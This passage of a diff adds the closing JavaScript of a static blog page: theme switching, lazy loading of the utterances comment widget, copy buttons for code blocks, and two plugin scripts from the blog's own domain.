.27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","ac0d3r/ac0d3r.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+<script src="https://blog.imipy.com/plugins/GmeekTOC.js"></script>
+<script src="https://blog.imipy.com/plugins/lightbox.js"></script>
+</html>
